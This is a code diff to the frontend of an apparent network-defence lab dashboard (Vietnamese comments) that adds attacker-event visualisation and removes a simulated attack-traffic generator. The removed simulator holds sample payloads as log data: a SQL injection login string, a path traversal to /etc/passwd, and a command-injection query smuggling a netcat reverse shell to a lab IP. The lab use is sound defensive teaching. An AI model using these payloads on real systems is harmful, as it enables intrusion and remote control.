@@ -229,6 +229,27 @@ function initSocket() {
     if (!state.attackEvents.some(item => item.event_id === event.event_id)) state.attackEvents.push(event);
     state.attackEvents = state.attackEvents.slice(-300);
     renderAttackEvents();
+
+    // Hiển thị hạt gói tin tấn công thật trên sơ đồ mạng từ sự kiện Attacker (S1..S6)
+    const p = (event && event.payload) || {};
+    if (p.state === 'RUNNING' || p.type === 'progress' || p.type === 'result') {
+      const scenarioTagMap = {
+        S1: 'COMMAND_INJECTION',
+        S2: 'SYN_FLOOD',
+        S3: 'FD_EXHAUSTION',
+        S4: 'PATH_TRAVERSAL',
+        S5: 'ARP_SPOOF',
+        S6: 'RST_INJECTION',
+      };
+      const mappedTag = scenarioTagMap[event.scenario] || 'ATTACK';
+      spawnPacketParticles({
+        is_suspicious: true,
+        attack_tag: mappedTag,
+        status_code: p.result && p.result.outcome === 'BLOCKED' ? 403 : 200,
+        client_ip: event.source_ip || '172.30.44.66',
+        endpoint: `[ATTACKER ${event.scenario}] ${p.stage || p.state || p.type || event.event_type}`,
+      });
+    }
   });
   state.socket.on('DEFENSE_ERROR', payload => {
     document.getElementById('defense-error').textContent = payload.message;
@@ -2174,22 +2195,9 @@ function initEventListeners() {
     });
   }
 
-  // W6-ALL & W6-T1: Điều khiển Kill Chain 5 Giai đoạn & Stress Test SYN Flood Burst
-  const kcPlayBtn = document.getElementById('btn-run-killchain');
-  if (kcPlayBtn) kcPlayBtn.addEventListener('click', () => runAutoKillChain());
-
-  const stressBtn = document.getElementById('btn-stress-syn-burst');
-  if (stressBtn) stressBtn.addEventListener('click', () => runSynFloodStressBurst(120));
-
+  // W6-ALL & W6-T1: Nút bật nhanh 3 Lớp Khiên Chắn
   const enableAllShieldsBtn = document.getElementById('btn-enable-all-shields');
   if (enableAllShieldsBtn) enableAllShieldsBtn.addEventListener('click', () => enableAllThreeShields());
-
-  for (const stepBtn of document.querySelectorAll('[data-kc-trigger]')) {
-    stepBtn.addEventListener('click', () => {
-      const stageId = Number(stepBtn.getAttribute('data-kc-trigger'));
-      executeKillChainStage(stageId);
-    });
-  }
 
   // Nút Auto-scroll
   const autoScrollBtn = document.getElementById('btn-toggle-autoscroll');
@@ -2228,21 +2236,6 @@ function initEventListeners() {
   // Đóng Modal Inspector
   document.getElementById('btn-close-modal').addEventListener('click', closeModal);
   document.querySelector('.modal-backdrop').addEventListener('click', closeModal);
-
-  // Quick Demo Traffic Buttons
-  document.getElementById('btn-demo-ping').addEventListener('click', () => simulateTraffic('ping'));
-  document.getElementById('btn-demo-user').addEventListener('click', () => simulateTraffic('normal-login'));
-  document.getElementById('btn-demo-arp').addEventListener('click', () => simulateTraffic('arp-spoof'));
-  document.getElementById('btn-demo-syn').addEventListener('click', () => simulateTraffic('syn-flood'));
-  document.getElementById('btn-demo-rst').addEventListener('click', () => simulateTraffic('rst-inject'));
-  document.getElementById('btn-demo-clean-arp').addEventListener('click', () => restoreCleanArp());
-  document.getElementById('btn-demo-sqli').addEventListener('click', () => simulateTraffic('sqli'));
-  document.getElementById('btn-demo-bruteforce').addEventListener('click', () => simulateTraffic('brute-force'));
-  document.getElementById('btn-demo-revshell').addEventListener('click', () => simulateTraffic('reverse-shell'));
-  document.getElementById('btn-demo-fd-exhaust').addEventListener('click', () => simulateTraffic('fd-exhaust'));
-  document.getElementById('btn-demo-traversal').addEventListener('click', () => simulateTraffic('path-traversal'));
-  document.getElementById('btn-demo-dos').addEventListener('click', () => simulateTraffic('dos'));
-  document.getElementById('btn-demo-clean-os').addEventListener('click', () => restoreCleanOs());
 }
 
 async function restoreCleanOs() {
@@ -2369,7 +2362,7 @@ function renderAttackEvents() {
     const details = document.createElement('details');
     const summary = document.createElement('summary');
     const step = event.payload.state || event.payload.stage || event.payload.type || event.event_type;
-    summary.textContent = `${event.timestamp} | ${event.scenario}${event.execution_mode === 'simulated' ? ' · Mô phỏng' : ''} | ${step} | run ${event.run_id}`;
+    summary.textContent = `${event.timestamp} | ${event.scenario} | ${step} | run ${event.run_id}`;
     const evidence = document.createElement('pre');
     evidence.textContent = JSON.stringify(event, null, 2);
     details.append(summary, evidence);
@@ -2387,248 +2380,6 @@ function closeModal() {
   document.getElementById('inspector-modal').classList.add('hidden');
 }
 
-// ==========================================
-// 7. TRAFFIC SIMULATOR & CROSS-LAYER FUNNEL DEMO ASSISTANT (W5-T1 / W5-T3)
-// ==========================================
-async function simulateTraffic(type) {
-  let logPayload = null;
-
-  // Kiểm tra trạng thái chi tiết của từng Lớp Khiên (L1 Network, L2 OS, L3 App & L7 Sub-flags)
-  const l1On = Boolean(state.defenseL1Active);
-  const l2On = Boolean(state.defenseL2Active);
-  const l3SqliOn = Boolean(
-    state.defenseL3Active || (typeof state.defenseL3Active === 'boolean' && state.defenseL3Subflags.anti_sqli),
-  );
-  const l3RateLimitOn = Boolean(
-    state.defenseL3Active || (typeof state.defenseL3Active === 'boolean' && state.defenseL3Subflags.rate_limit),
-  );
-  const l3SanitizerOn = Boolean(
-    state.defenseL3Active || (typeof state.defenseL3Active === 'boolean' && state.defenseL3Subflags.input_sanitization),
-  );
-
-  if (type === 'ping') {
-    logPayload = {
-      timestamp: new Date().toISOString(),
-      method: 'GET',
-      endpoint: '/api/ping',
-      status_code: 200,
-      response_time: Math.floor(Math.random() * 8) + 2,
-      client_ip: '192.168.1.10',
-      payload_summary: { query: { t: Date.now() }, echo: 'ping-check' },
-      attack_tag: 'NORMAL',
-      is_suspicious: false,
-      defense_action: 'allowed',
-    };
-  } else if (type === 'normal-login') {
-    logPayload = {
-      timestamp: new Date().toISOString(),
-      method: 'POST',
-      endpoint: '/api/auth/login',
-      status_code: 200,
-      response_time: Math.floor(Math.random() * 15) + 10,
-      client_ip: '172.20.0.10',
-      payload_summary: {
-        body_preview: { username: 'engineer_user', password: 'pass123' },
-        token_preview: 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJlbmdpbmVlcl91c2VyIn0.signature',
-      },
-      attack_tag: 'NORMAL',
-      is_suspicious: false,
-      defense_action: 'allowed',
-    };
-  } else if (type === 'arp-spoof') {
-    logPayload = {
-      timestamp: new Date().toISOString(),
-      method: 'ARP',
-      endpoint: '/L2/arp-cache-poison (Gratuitous ARP Reply)',
-      status_code: l1On ? 403 : 200,
-      response_time: 1,
-      client_ip: '172.20.0.66',
-      payload_summary: {
-        spoofed_ip: '172.20.0.20',
-        spoofed_mac: '02:42:ac:14:00:42',
-        l1_static_arp: l1On ? 'ENFORCED (PERMANENT NUD)' : 'DYNAMIC (VULNERABLE)',
-        body_preview: { username: 'engineer_user', password: 'pass123' },
-        token_preview: 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJlbmdpbmVlcl91c2VyIn0.mitm_captured',
-        detected_patterns: l1On ? ['BLOCKED_BY_L1_STATIC_ARP'] : ['ARP_CACHE_POISONING', 'MITM_HTTP_SNIFF'],
-      },
-      attack_tag: 'ARP_SPOOF',
-      is_suspicious: true,
-      defense_action: l1On ? 'blocked' : 'monitored',
-    };
-  } else if (type === 'syn-flood') {
-    const synBlockedByL1 = l1On;
-    const synMitigatedByL2 = !l1On && l2On;
-    logPayload = {
-      timestamp: new Date().toISOString(),
-      method: 'TCP',
-      endpoint: '/L4/tcp-syn-flood (Flags: SYN, Port: 8000, Rate: 150 pps)',
-      status_code: synBlockedByL1 ? 429 : synMitigatedByL2 ? 200 : 503,
-      response_time: synBlockedByL1 ? 4 : synMitigatedByL2 ? 18 : 420,
-      client_ip: '172.20.0.66',
-      payload_summary: {
-        pps: 150,
-        backlog_queue: synBlockedByL1
-          ? 'L1_IPTABLES_SYN_LIMIT_DROPPED'
-          : synMitigatedByL2
-            ? 'L2_TCP_SYNCOOKIES_MITIGATED'
-            : 'SYN_RECV_OVERFLOW',
-        detected_patterns: ['HALF_OPEN_SYN_FLOOD'],
-      },
-      attack_tag: 'SYN_FLOOD',
-      is_suspicious: true,
-      defense_action: synBlockedByL1 ? 'rate_limited' : synMitigatedByL2 ? 'blocked' : 'monitored',
-    };
-  } else if (type === 'rst-inject') {
-    const seqNum = Math.floor(200000000 + Math.random() * 700000000);
-    logPayload = {
-      timestamp: new Date().toISOString(),
-      method: 'TCP',
-      endpoint: `/L4/tcp-rst-injection (Flags: RST, SEQ=${seqNum})`,
-      status_code: l1On ? 403 : 499,
-      response_time: 2,
-      client_ip: '172.20.0.66',
-      payload_summary: {
-        seq_num: seqNum,
-        victim_ip: '172.20.0.10',
-        target_ip: '172.20.0.20',
-        l1_iptables_filter: l1On ? 'DROPPED_FORGED_RST' : 'BYPASSED',
-        detected_patterns: ['FORGED_TCP_RST_PACKET'],
-      },
-      attack_tag: 'RST_INJECTION',
-      is_suspicious: true,
-      defense_action: l1On ? 'blocked' : 'monitored',
-    };
-  } else if (type === 'sqli') {
-    logPayload = {
-      timestamp: new Date().toISOString(),
-      method: 'POST',
-      endpoint: '/api/auth/login',
-      status_code: l3SqliOn ? 401 : 200,
-      response_time: Math.floor(Math.random() * 25) + 8,
-      client_ip: '172.20.0.66',
-      payload_summary: {
-        body_preview: { username: "admin' OR '1'='1' --", password: '******' },
-        cross_layer_note: l1On || l2On ? 'Passed L1/L2 (Valid TCP/HTTP) -> Inspected at L3' : 'Direct L7 Exploit',
-        detected_patterns: ['SQL_INJECTION_AUTH_BYPASS'],
-      },
-      attack_tag: 'SQL_INJECTION',
-      is_suspicious: true,
-      defense_action: l3SqliOn ? 'sanitized' : 'allowed',
-    };
-  } else if (type === 'brute-force') {
-    state.bruteForceCounter += 1;
-    logPayload = {
-      timestamp: new Date().toISOString(),
-      method: 'POST',
-      endpoint: '/api/auth/login',
-      status_code: l3RateLimitOn ? 429 : 401,
-      response_time: Math.floor(Math.random() * 14) + 6,
-      client_ip: '172.20.0.66',
-      payload_summary: {
-        body_preview: { username: 'admin', password: `rockyou_pass_${state.bruteForceCounter}` },
-        attempts_count: state.bruteForceCounter,
-        rate_rps: 1,
-        cross_layer_note: l1On ? 'Bypassed L1 iptables (Low-rate 1 req/s) -> Caught by L3 Token Bucket' : 'Low-rate 1 req/s',
-        detected_patterns: ['LOW_RATE_BRUTE_FORCE_1RPS'],
-      },
-      attack_tag: 'BRUTE_FORCE',
-      is_suspicious: true,
-      defense_action: l3RateLimitOn ? 'rate_limited' : 'allowed',
-    };
-  } else if (type === 'reverse-shell') {
-    const shellCmd = 'nc -e /bin/sh 172.20.0.66 4444';
-    const blockedAtL3 = l3SanitizerOn;
-    const blockedAtL2 = !l3SanitizerOn && l2On;
-    logPayload = {
-      timestamp: new Date().toISOString(),
-      method: 'GET',
-      endpoint: `/api/system/network-ping?host=127.0.0.1;${encodeURIComponent(shellCmd)}`,
-      status_code: blockedAtL3 ? 400 : blockedAtL2 ? 403 : 200,
-      response_time: Math.floor(Math.random() * 40) + 18,
-      client_ip: '172.20.0.66',
-      payload_summary: {
-        query: { host: `127.0.0.1; ${shellCmd}` },
-        shell_cmd: shellCmd,
-        defense_layer: blockedAtL3
-          ? 'BLOCKED_AT_L3_INPUT_SANITIZER'
-          : blockedAtL2
-            ? 'BLOCKED_AT_L2_OS_NOLOGIN_CGROUPS'
-            : 'COMPROMISED_REVERSE_SHELL_ACTIVE',
-        detected_patterns: ['OS_COMMAND_INJECTION', 'REVERSE_SHELL_SPAWN'],
-      },
-      attack_tag: 'COMMAND_INJECTION',
-      is_suspicious: true,
-      defense_action: blockedAtL3 ? 'sanitized' : blockedAtL2 ? 'blocked' : 'allowed',
-    };
-  } else if (type === 'fd-exhaust') {
-    logPayload = {
-      timestamp: new Date().toISOString(),
-      method: 'POST',
-      endpoint: '/OS/fd-exhaustion (ulimit/lsof saturation & fork bomb)',
-      status_code: l2On ? 403 : 503,
-      response_time: l2On ? 15 : 310,
-      client_ip: '172.20.0.66',
-      payload_summary: {
-        open_fds: l2On ? 164 : 968,
-        max_fds: l2On ? 512 : 1024,
-        l2_os_limits: l2On ? 'CONTAINED (ulimit -n 512, cgroups pids.max=50)' : 'UNLIMITED (EMFILE EXHAUSTED)',
-        detected_patterns: ['EMFILE_TOO_MANY_OPEN_FILES', 'FD_TABLE_EXHAUSTION'],
-      },
-      attack_tag: 'FD_EXHAUSTION',
-      is_suspicious: true,
-      defense_action: l2On ? 'blocked' : 'monitored',
-    };
-  } else if (type === 'path-traversal') {
-    logPayload = {
-      timestamp: new Date().toISOString(),
-      method: 'GET',
-      endpoint: '/api/files/download?name=../../../../etc/passwd',
-      status_code: l3SanitizerOn ? 400 : 200,
-      response_time: Math.floor(Math.random() * 20) + 7,
-      client_ip: '172.20.0.66',
-      payload_summary: {
-        query: { name: '../../../../etc/passwd' },
-        target_file: '/etc/passwd',
-        detected_patterns: ['DOT_DOT_SLASH_PATH_TRAVERSAL'],
-      },
-      attack_tag: 'PATH_TRAVERSAL',
-      is_suspicious: true,
-      defense_action: l3SanitizerOn ? 'blocked' : 'allowed',
-    };
-  } else if (type === 'dos') {
-    logPayload = {
-      timestamp: new Date().toISOString(),
-      method: 'GET',
-      endpoint: '/api/heavy-load?iterations=500000',
-      status_code: l3RateLimitOn ? 429 : 200,
-      response_time: l3RateLimitOn ? 5 : Math.floor(Math.random() * 300) + 150,
-      client_ip: '192.168.1.200',
-      payload_summary: {
-        query: { iterations: 500000 },
-        cross_layer_note: l1On ? 'Bypassed L1 SYN Filter (Single TCP connection) -> Blocked at L3 Rate Limiter' : 'Heavy CPU load',
-      },
-      attack_tag: 'HEAVY_DOS',
-      is_suspicious: true,
-      defense_action: l3RateLimitOn ? 'rate_limited' : 'allowed',
-    };
-  }
-
-  if (logPayload) {
-    logPayload.metadata = { source: 'demo', synthetic: true };
-    logPayload.endpoint = '[DEMO] ' + logPayload.endpoint;
-    try {
-      await fetch('/api/telemetry', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(logPayload),
-      });
-    } catch (e) {
-      // Fallback local visual
-      handleIncomingTelemetry(logPayload);
-    }
-  }
-}
-
 // Utility Helpers
 function truncate(str, max) {
   if (!str) return '';
@@ -2640,7 +2391,7 @@ function escapeHtml(str) {
 }
 
 // ==========================================
-// 8. W6-T1 & W6-ALL: 1-TOUCH LAB RESET, KILL CHAIN 5-STAGE STEPPER & SYN FLOOD STRESS BURST
+// 7. W6-T1 & W6-ALL: 1-TOUCH LAB RESET & KILL CHAIN 5-STAGE STEPPER
 // ==========================================
 function updateKillChainUI(kcState) {
   if (!kcState || !Array.isArray(kcState.stages)) return;
@@ -2692,55 +2443,6 @@ function updateKillChainUI(kcState) {
   }
 }
 
-async function executeKillChainStage(stageId) {
-  const stageEl = document.getElementById(`kc-stage-${stageId}`);
-  const pillEl = document.getElementById(`kc-pill-${stageId}`);
-  if (stageEl) {
-    stageEl.classList.remove('kc-compromised', 'kc-blocked');
-    stageEl.classList.add('kc-running');
-  }
-  if (pillEl) pillEl.textContent = '⏳ RUNNING';
-
-  if (stageId === 1) {
-    await simulateTraffic('arp-spoof');
-    await simulateTraffic('normal-login');
-  } else if (stageId === 2) {
-    await simulateTraffic('brute-force');
-    await simulateTraffic('sqli');
-  } else if (stageId === 3) {
-    await simulateTraffic('reverse-shell');
-  } else if (stageId === 4) {
-    await simulateTraffic('path-traversal');
-  } else if (stageId === 5) {
-    await simulateTraffic('syn-flood');
-    await simulateTraffic('fd-exhaust');
-    await simulateTraffic('rst-inject');
-  }
-}
-
-async function runAutoKillChain() {
-  if (state.killChain.autoPlaying) return;
-  state.killChain.autoPlaying = true;
-  const playBtn = document.getElementById('btn-run-killchain');
-  if (playBtn) {
-    playBtn.disabled = true;
-    playBtn.textContent = '⏳ EXECUTING 5-STAGE KILL CHAIN...';
-  }
-  try {
-    await fetch('/api/killchain/reset', { method: 'POST' }).catch(() => {});
-    for (let stageId = 1; stageId <= 5; stageId++) {
-      await executeKillChainStage(stageId);
-      await new Promise((r) => setTimeout(r, 650));
-    }
-  } finally {
-    state.killChain.autoPlaying = false;
-    if (playBtn) {
-      playBtn.disabled = false;
-      playBtn.textContent = '▶ AUTO-PLAY KILL CHAIN (5 STAGES)';
-    }
-  }
-}
-
 async function enableAllThreeShields() {
   const btn = document.getElementById('btn-enable-all-shields');
   if (btn) btn.disabled = true;
@@ -2764,64 +2466,6 @@ async function enableAllThreeShields() {
     ]);
   } finally {
     if (btn) btn.disabled = false;
-  }
-}
-
-/**
- * W6-T1: Bắn bão 120 gói SYN Flood liên hoàn để kiểm chứng rAF Event Batching & Particle Cap giữ UI mượt 60 FPS
- */
-async function runSynFloodStressBurst(count = 120) {
-  const btn = document.getElementById('btn-stress-syn-burst');
-  if (btn) {
-    btn.disabled = true;
-    btn.textContent = `🌊 FLOODING ${count} SYN PKTS...`;
-  }
-  try {
-    const l1On = Boolean(state.defenseL1Active);
-    const l2On = Boolean(state.defenseL2Active);
-    const batchPromises = [];
-    for (let i = 0; i < count; i++) {
-      const payload = {
-        timestamp: new Date().toISOString(),
-        method: 'TCP',
-        endpoint: `[DEMO] /L4/tcp-syn-flood-burst#${i + 1} (Flags: SYN, Port: 8000, Burst: ${count} pps)`,
-        status_code: l1On ? 429 : l2On ? 200 : 503,
-        response_time: l1On ? 2 : l2On ? 12 : 340,
-        client_ip: '172.20.0.66',
-        payload_summary: {
-          burst_index: i + 1,
-          total_burst: count,
-          pps: count,
-          backlog_queue: l1On
-            ? 'L1_IPTABLES_SYN_LIMIT_DROPPED'
-            : l2On
-              ? 'L2_TCP_SYNCOOKIES_MITIGATED'
-              : 'SYN_RECV_OVERFLOW',
-        },
-        attack_tag: 'SYN_FLOOD',
-        is_suspicious: true,
-        defense_action: l1On ? 'rate_limited' : l2On ? 'blocked' : 'monitored',
-        metadata: { source: 'demo', synthetic: true, burst: true },
-      };
-      batchPromises.push(
-        fetch('/api/telemetry', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload),
-        }).catch(() => enqueueTelemetryUpdate({ log: payload })),
-      );
-      if (batchPromises.length >= 20) {
-        await Promise.all(batchPromises.splice(0, batchPromises.length));
-      }
-    }
-    if (batchPromises.length > 0) {
-      await Promise.all(batchPromises);
-    }
-  } finally {
-    if (btn) {
-      btn.disabled = false;
-      btn.textContent = '🌊 STRESS TEST SYN BURST (120 PKTS)';
-    }
   }
 }
 
